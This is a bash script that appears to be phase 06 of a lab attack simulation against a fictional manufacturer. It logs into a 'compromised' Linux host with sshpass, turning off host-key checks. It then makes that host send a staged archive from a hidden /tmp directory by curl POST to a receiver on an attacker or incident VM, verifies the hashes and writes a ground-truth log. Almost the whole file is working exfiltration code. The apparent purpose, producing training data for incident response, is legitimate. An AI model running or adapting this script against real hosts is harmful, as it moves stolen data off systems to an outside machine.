#!/bin/bash

# ============================================================
# Nordic Manufacturing A/S - Attack Simulation
# Phase 06 - Data Exfiltration
# ============================================================

set -u

BASE_DIR="/opt/nordic-attack"
LOG_DIR="$BASE_DIR/logs"
UPLOAD_DIR="$BASE_DIR/uploads"
SINK="$BASE_DIR/sink.py"

mkdir -p "$LOG_DIR" "$UPLOAD_DIR"

TIMESTAMP=$(date +"%Y%m%d-%H%M%S")
INCIDENT_ID="${NORDIC_INCIDENT_ID:-MANUAL-$TIMESTAMP}"
LOG_FILE="$LOG_DIR/${INCIDENT_ID}-06-exfil.log"
SINK_LOG="$LOG_DIR/${INCIDENT_ID}-sink.log"

SINK_PORT=8088
REMOTE_ARCHIVE="/tmp/.cache-update/nordic-data.tar.gz"

echo "======================================================"
echo " Nordic Manufacturing - Phase 06"
echo " Data Exfiltration"
echo "======================================================"
echo

# ------------------------------------------------------------
# Dependencies
# ------------------------------------------------------------

for CMD in sshpass python3 curl sha256sum; do
    if ! command -v "$CMD" >/dev/null 2>&1; then
        echo "[ERROR] Missing dependency: $CMD"
        exit 1
    fi
done

if [[ ! -f "$SINK" ]]; then
    echo "[ERROR] sink.py not found:"
    echo "        $SINK"
    exit 1
fi

# ------------------------------------------------------------
# AUTO / MANUAL
# ------------------------------------------------------------

if [[ "${NORDIC_AUTO:-0}" == "1" ]]; then

    for VAR in \
        NORDIC_COMPROMISED_HOST \
        NORDIC_INCIDENT_IP \
        NORDIC_SSH_USER \
        NORDIC_SSH_PASSWORD
    do
        if [[ -z "${!VAR:-}" ]]; then
            echo "[ERROR] $VAR is not set."
            exit 1
        fi
    done

    TARGET="$NORDIC_COMPROMISED_HOST"
    INCIDENT_IP="$NORDIC_INCIDENT_IP"
    SSH_USER="$NORDIC_SSH_USER"
    SSH_PASSWORD="$NORDIC_SSH_PASSWORD"

    echo "[AUTO MODE]"
    echo "Compromised host : $TARGET"
    echo "Exfil destination: $INCIDENT_IP:$SINK_PORT"

else

    echo "[MANUAL MODE]"

    read -rp "Compromised Linux host: " TARGET
    read -rp "IncidentVM/AttackVM IP: " INCIDENT_IP
    read -rp "SSH username: " SSH_USER
    read -rsp "SSH password: " SSH_PASSWORD
    echo

fi

if [[ -z "$TARGET" ||
      -z "$INCIDENT_IP" ||
      -z "$SSH_USER" ||
      -z "$SSH_PASSWORD" ]]; then

    echo "[ERROR] Missing required information."
    exit 1
fi

echo
echo "[*] Incident ID : $INCIDENT_ID"
echo "[*] Source      : $TARGET"
echo "[*] Destination : $INCIDENT_IP:$SINK_PORT"
echo "[*] Archive     : $REMOTE_ARCHIVE"
echo

{
    echo "Incident ID: $INCIDENT_ID"
    echo "Phase: DATA EXFILTRATION"
    echo "Timestamp: $(date --iso-8601=seconds)"
    echo "Source: $TARGET"
    echo "Destination: $INCIDENT_IP:$SINK_PORT"
    echo "Archive: $REMOTE_ARCHIVE"
    echo
} >> "$LOG_FILE"

# ------------------------------------------------------------
# Verify remote archive
# ------------------------------------------------------------

echo "[1/5] Checking staged archive..."

REMOTE_INFO=$(sshpass -p "$SSH_PASSWORD" \
    ssh \
    -o StrictHostKeyChecking=no \
    -o UserKnownHostsFile=/dev/null \
    -o ConnectTimeout=5 \
    "$SSH_USER@$TARGET" \
    "
        if [[ ! -f '$REMOTE_ARCHIVE' ]]; then
            echo 'ARCHIVE_MISSING'
            exit 2
        fi

        echo 'ARCHIVE_OK'
        ls -lh '$REMOTE_ARCHIVE'
        sha256sum '$REMOTE_ARCHIVE'
    " 2>/dev/null)

REMOTE_RESULT=$?

echo "$REMOTE_INFO"

if [[ $REMOTE_RESULT -ne 0 ]] ||
   ! grep -q "ARCHIVE_OK" <<< "$REMOTE_INFO"; then

    echo
    echo "[ERROR] Staged archive not found."
    echo "Run 05-staging.sh first."
    exit 1
fi

REMOTE_HASH=$(echo "$REMOTE_INFO" |
    awk '/nordic-data.tar.gz/ && $1 ~ /^[a-f0-9]{64}$/ {print $1}' |
    tail -n 1)

{
    echo "REMOTE ARCHIVE"
    echo "$REMOTE_INFO"
    echo
} >> "$LOG_FILE"

echo
sleep 2

# ------------------------------------------------------------
# Start sink
# ------------------------------------------------------------

echo "[2/5] Starting controlled exfiltration receiver..."

python3 "$SINK" \
    --port "$SINK_PORT" \
    --output "$UPLOAD_DIR" \
    > "$SINK_LOG" 2>&1 &

SINK_PID=$!

cleanup() {
    if kill -0 "$SINK_PID" 2>/dev/null; then
        kill "$SINK_PID" 2>/dev/null || true
        wait "$SINK_PID" 2>/dev/null || true
    fi
}

trap cleanup EXIT

sleep 2

if ! kill -0 "$SINK_PID" 2>/dev/null; then
    echo "[ERROR] sink.py failed to start."
    echo "Check: $SINK_LOG"
    exit 1
fi

echo "[+] Receiver running on TCP/$SINK_PORT"
echo

# ------------------------------------------------------------
# Health check
# ------------------------------------------------------------

echo "[3/5] Testing receiver..."

HEALTH=$(curl -s \
    --max-time 3 \
    "http://127.0.0.1:$SINK_PORT/health" \
    2>/dev/null || true)

if [[ "$HEALTH" != *"OK"* && "$HEALTH" != *"ok"* ]]; then
    echo "[ERROR] Receiver health check failed."
    exit 1
fi

echo "[+] Receiver ready."
echo
sleep 2

# ------------------------------------------------------------
# Exfiltrate archive
# ------------------------------------------------------------

echo "[4/5] Simulating exfiltration..."
echo
echo "$TARGET  --->  http://$INCIDENT_IP:$SINK_PORT/upload"
echo

EXFIL_RESULT=$(sshpass -p "$SSH_PASSWORD" \
    ssh \
    -o StrictHostKeyChecking=no \
    -o UserKnownHostsFile=/dev/null \
    "$SSH_USER@$TARGET" \
    "
        curl \
            --silent \
            --show-error \
            --max-time 30 \
            -X POST \
            -H 'Content-Type: application/octet-stream' \
            -H 'X-Nordic-Filename: nordic-data.tar.gz' \
            --data-binary '@$REMOTE_ARCHIVE' \
            'http://$INCIDENT_IP:$SINK_PORT/upload'
    " 2>&1)

EXFIL_STATUS=$?

echo "$EXFIL_RESULT"

{
    echo "EXFILTRATION"
    echo "Timestamp: $(date --iso-8601=seconds)"
    echo "$EXFIL_RESULT"
    echo
} >> "$LOG_FILE"

if [[ $EXFIL_STATUS -ne 0 ]]; then
    echo
    echo "[ERROR] Exfiltration failed."
    exit 1
fi

echo
echo "[+] Transfer completed."

sleep 2

# ------------------------------------------------------------
# Stop receiver and verify upload
# ------------------------------------------------------------

echo
echo "[5/5] Verifying received data..."

cleanup
trap - EXIT

RECEIVED_FILE=$(find "$UPLOAD_DIR" \
    -type f \
    -name "*nordic-data.tar.gz" \
    -printf "%T@ %p\n" 2>/dev/null |
    sort -nr |
    head -n 1 |
    cut -d' ' -f2-)

if [[ -z "$RECEIVED_FILE" || ! -f "$RECEIVED_FILE" ]]; then
    echo "[ERROR] No received archive found."
    exit 1
fi

LOCAL_HASH=$(sha256sum "$RECEIVED_FILE" | awk '{print $1}')
LOCAL_SIZE=$(stat -c '%s' "$RECEIVED_FILE")

echo "[+] Received:"
echo "    $RECEIVED_FILE"
echo
echo "    Size   : $LOCAL_SIZE bytes"
echo "    SHA256 : $LOCAL_HASH"

if [[ -n "$REMOTE_HASH" && "$REMOTE_HASH" == "$LOCAL_HASH" ]]; then
    HASH_RESULT="MATCH"
    echo
    echo "[+] SHA256 hashes match."
else
    HASH_RESULT="UNKNOWN_OR_MISMATCH"
    echo
    echo "[!] Unable to confirm matching hashes."
fi

# ------------------------------------------------------------
# Ground truth
# ------------------------------------------------------------

{
    echo
    echo "=================================================="
    echo "GROUND TRUTH"
    echo "=================================================="
    echo "Incident: $INCIDENT_ID"
    echo "Phase: DATA EXFILTRATION"
    echo
    echo "Source:"
    echo "$TARGET"
    echo
    echo "Destination:"
    echo "$INCIDENT_IP:$SINK_PORT"
    echo
    echo "Protocol:"
    echo "HTTP POST"
    echo
    echo "Remote archive:"
    echo "$REMOTE_ARCHIVE"
    echo
    echo "Received file:"
    echo "$RECEIVED_FILE"
    echo
    echo "Remote SHA256:"
    echo "${REMOTE_HASH:-UNKNOWN}"
    echo
    echo "Received SHA256:"
    echo "$LOCAL_HASH"
    echo
    echo "Hash verification:"
    echo "$HASH_RESULT"
    echo
    echo "Activity:"
    echo "- Staged archive located"
    echo "- HTTP connection established"
    echo "- Archive transferred using HTTP POST"
    echo "- File received by controlled sink"
    echo "- SHA256 verification performed"
    echo
    echo "This is controlled CyberLab exfiltration"
    echo "using synthetic training data."
    echo "=================================================="
} >> "$LOG_FILE"

echo
echo "======================================================"
echo " Phase 06 complete - Data exfiltrated"
echo "======================================================"
echo
echo "Source       : $TARGET"
echo "Destination  : $INCIDENT_IP:$SINK_PORT"
echo "Received     : $RECEIVED_FILE"
echo "Incident ID  : $INCIDENT_ID"
echo "Ground truth : $LOG_FILE"
echo